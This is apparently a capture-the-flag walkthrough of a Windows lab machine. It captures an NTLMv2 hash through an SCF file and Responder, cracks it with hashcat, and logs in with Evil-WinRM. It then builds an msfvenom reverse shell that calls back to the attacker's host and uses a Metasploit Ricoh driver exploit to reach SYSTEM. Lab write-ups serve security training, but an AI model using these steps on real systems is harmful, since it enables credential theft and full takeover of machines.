## NMAP SCAN 
```
nmap -sSCV -p- 10.129.95.238                                                   
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-07 20:25 +0700
Nmap scan report for 10.129.95.238
Host is up (0.078s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
135/tcp  open  msrpc        Microsoft Windows RPC
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h29m59s, deviation: 0s, median: 1h29m58s
| smb2-time: 
|   date: 2026-05-07T14:57:30
|_  start_date: 2026-05-07T14:54:04
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

```

there is a website, we login using admin:admin 
```
pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/
```

we can use this to get hashes.... 
```

[SMB] NTLMv2-SSP Client   : 10.129.95.238
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:f0c207db34130c64:0567D3F69665BEEB2E4DDE44F0C03089:010100000000000000893E1061DEDC0187341244067F72DC00000000020008005A00380057004F0001001E00570049004E002D004A0051003200390030003800330054004C0030004E0004003400570049004E002D004A0051003200390030003800330054004C0030004E002E005A00380057004F002E004C004F00430041004C00030014005A00380057004F002E004C004F00430041004C00050014005A00380057004F002E004C004F00430041004C000700080000893E1061DEDC0106000400020000000800300030000000000000000000000000200000778CA0A182361F8B2D59670766BF4DF3B477564F39BCF3902C577CB23FEA3AF40A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0035003300000000000000000000000000
```

and we got the hash using responder 
```
TONY::DRIVER:f0c207db34130c64:0567d3f69665beeb2e4dde44f0c03089:010100000000000000893e1061dedc0187341244067f72dc00000000020008005a00380057004f0001001e00570049004e002d004a0051003200390030003800330054004c0030004e0004003400570049004e002d004a0051003200390030003800330054004c0030004e002e005a00380057004f002e004c004f00430041004c00030014005a00380057004f002e004c004f00430041004c00050014005a00380057004f002e004c004f00430041004c000700080000893e1061dedc0106000400020000000800300030000000000000000000000000200000778ca0a182361f8b2d59670766bf4df3b477564f39bcf3902c577cb23fea3af40a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0035003300000000000000000000000000:liltony
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: TONY::DRIVER:f0c207db34130c64:0567d3f69665beeb2e4dd...000000
Time.Started.....: Thu May  7 20:37:31 2026 (0 secs)
Time.Estimated...: Thu May  7 20:37:31 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1064.7 kH/s (1.23ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 35840/14344385 (0.25%)
Rejected.........: 0/35840 (0.00%)
Restore.Point....: 30720/14344385 (0.21%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: !!!!!! -> skater11
Hardware.Mon.#01.: Util: 14%

Started: Thu May  7 20:37:27 2026
Stopped: Thu May  7 20:37:33 2026
```

tony:liltony

```
evil-winrm -i 10.129.95.238 -u tony -p liltony                                     
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\tony\Documents> cd ..
*Evil-WinRM* PS C:\Users\tony> cd Desktop
*Evil-WinRM* PS C:\Users\tony\Desktop> type user.txt
9ec91c62ef7e8e86c0ea26400227e6f7
```

got user flag lest priv esc

```
*Evil-WinRM* PS C:\Users\tony\Desktop> whoami /all

USER INFORMATION
----------------

User Name   SID
=========== ==============================================
driver\tony S-1-5-21-3114857038-1253923253-2196841645-1003


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users        Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== =======
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
SeTimeZonePrivilege           Change the time zone                 Enabled

```

```
ÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell Settings (T1059.001)
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.0.10240.17146
    PowerShell Core Version: 
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    PS history size: 134B
```

found this using winpeas
```
*Evil-WinRM* PS C:\Users\tony\Desktop> type C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Add-Printer -PrinterName "RICOH_PCL6" -DriverName 'RICOH PCL6 UniversalDriver V4.23' -PortName 'lpt1:'

ping 1.1.1.1
ping 1.1.1.1
```

metasploit has the priv esc exploit for this so we will use this 
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.53 LPORT=9001 -f exe -o revshell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7680 bytes
Saved as: revshell.exe

*Evil-WinRM* PS C:\Programdata> upload revshell.exe
                                        
Info: Uploading /home/kali/revshell.exe to C:\Programdata\revshell.exe
                                        
Data: 10240 bytes of 10240 bytes copied
                                        
Info: Upload successful!

```

and upload it then use it to get a meterpreter session
```
msf > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set LHOST tun0
LHOST => tun0
msf exploit(multi/handler) > set LPORT 9001
LPORT => 9001
msf exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > run
*] Started reverse TCP handler on 10.10.14.53:9001 
[*] Sending stage (248902 bytes) to 10.129.95.238
[*] Meterpreter session 81 opened (10.10.14.53:9001 -> 10.129.95.238:49622) at 2026-05-07 21:26:45 +0700

meterpreter > bg
[*] Backgrounding session 81...
msf exploit(multi/handler) > search ricoh

Matching Modules
================

   #  Name                                        Disclosure Date  Rank    Check  Description
   -  ----                                        ---------------  ----    -----  -----------
   0  exploit/windows/ftp/ricoh_dl_bof            2012-03-01       normal  Yes    Ricoh DC DL-10 SR10 FTP USER Command Buffer Overflow
   1  exploit/windows/local/ricoh_driver_privesc  2020-01-22       normal  Yes    Ricoh Driver Privilege Escalation


Interact with a module by name or index. For example info 1, use 1 or use exploit/windows/local/ricoh_driver_privesc

msf exploit(multi/handler) > use 1
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf exploit(windows/local/ricoh_driver_privesc) > show options

Module options (exploit/windows/local/ricoh_driver_privesc):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows



View the full module info with the info, or info -d command.

msf exploit(windows/local/ricoh_driver_privesc) > set LHOST tun0
```
```
msf exploit(windows/local/ricoh_driver_privesc) > set SESSION 81
SESSION => 81
msf exploit(windows/local/ricoh_driver_privesc) > sessions -i 81
[*] Starting interaction with 81...

meterpreter > ps

Process List
============

 PID   PPID  Name                     Arch  Session  User         Path
 ---   ----  ----                     ----  -------  ----         ----
 0     0     [System Process]
 4     0     System
 264   4     smss.exe
 340   332   csrss.exe
 444   436   csrss.exe
 452   332   wininit.exe
 512   436   winlogon.exe
 560   452   services.exe
 568   452   lsass.exe
 576   560   svchost.exe              x64   1        DRIVER\tony  C:\Windows\System32\svchost.exe
 648   560   svchost.exe
 700   560   svchost.exe
 812   560   svchost.exe
 832   512   dwm.exe
 844   560   svchost.exe
 860   560   svchost.exe
 936   560   svchost.exe
 992   560   svchost.exe
 1012  936   WUDFHost.exe
 1072  560   svchost.exe
 1212  560   spoolsv.exe
 1236  648   explorer.exe             x64   1        DRIVER\tony  C:\Windows\explorer.exe
 1332  560   svchost.exe
 1376  648   explorer.exe             x64   1        DRIVER\tony  C:\Windows\explorer.exe
 1500  560   svchost.exe
 1564  560   svchost.exe
 1692  560   svchost.exe
 1748  560   VGAuthService.exe
 1792  560   vm3dservice.exe
 1892  560   vmtoolsd.exe
 1928  560   svchost.exe
 1940  1792  vm3dservice.exe
 2176  648   wsmprovhost.exe          x64   0        DRIVER\tony  C:\Windows\System32\wsmprovhost.exe
 2244  812   sihost.exe               x64   1        DRIVER\tony  C:\Windows\System32\sihost.exe
 2280  648   WmiPrvSE.exe
 2356  2176  revshell.exe             x64   0        DRIVER\tony  C:\ProgramData\revshell.exe
 2384  560   dllhost.exe
 2476  560   msdtc.exe
 2592  560   svchost.exe
 2680  560   svchost.exe
 2860  560   SearchIndexer.exe
 2900  812   cmd.exe                  x64   1        DRIVER\tony  C:\Windows\System32\cmd.exe
 2928  812   taskhostw.exe            x64   1        DRIVER\tony  C:\Windows\System32\taskhostw.exe
 3096  2900  conhost.exe              x64   1        DRIVER\tony  C:\Windows\System32\conhost.exe
 3192  3168  explorer.exe             x64   1        DRIVER\tony  C:\Windows\explorer.exe
 3244  648   RuntimeBroker.exe        x64   1        DRIVER\tony  C:\Windows\System32\RuntimeBroker.exe
 3536  648   ShellExperienceHost.exe  x64   1        DRIVER\tony  C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe
 3744  648   SearchUI.exe             x64   1        DRIVER\tony  C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe
 3908  2900  PING.EXE                 x64   1        DRIVER\tony  C:\Windows\System32\PING.EXE
 4112  560   sedsvc.exe
 4124  3192  vmtoolsd.exe             x64   1        DRIVER\tony  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 4160  3192  OneDrive.exe             x86   1        DRIVER\tony  C:\Users\tony\AppData\Local\Microsoft\OneDrive\OneDrive.exe
 4472  648   explorer.exe             x64   1        DRIVER\tony  C:\Windows\explorer.exe
```

we will migrate to a session which has '1' value that means it running 
```
meterpreter > migrate 2928
[*] Migrating from 4160 to 2928...
[*] Migration completed successfully.
meterpreter > bg
[*] Backgrounding session 81...
msf exploit(windows/local/ricoh_driver_privesc) > run
[*] Started reverse TCP handler on 10.10.14.53:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Ricoh driver directory has full permissions
[-] Exploit aborted due to failure: bad-config: The payload should use the same architecture as the target driver
[*] Deleting printer 
[*] Exploit completed, but no session was created.
```

seems like we have to set the payload 
```
msf exploit(windows/local/ricoh_driver_privesc) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf exploit(windows/local/ricoh_driver_privesc) > run
[*] Started reverse TCP handler on 10.10.14.53:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Ricoh driver directory has full permissions
[*] Adding printer oksxSK...
[*] Sending stage (248902 bytes) to 10.129.95.238
[+] Deleted C:\Users\tony\AppData\Local\Temp\aqizMfprS.bat
[+] Deleted C:\Users\tony\AppData\Local\Temp\headerfooter.dll
[*] Meterpreter session 82 opened (10.10.14.53:4444 -> 10.129.95.238:49623) at 2026-05-07 21:30:34 +0700
[*] Deleting printer oksxSK

meterpreter > shell
Process 3716 created.
Channel 2 created.
Microsoft Windows [Version 10.0.10240]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
b80a28838d228c1bc5bb482e22eada36

```

we got the root flag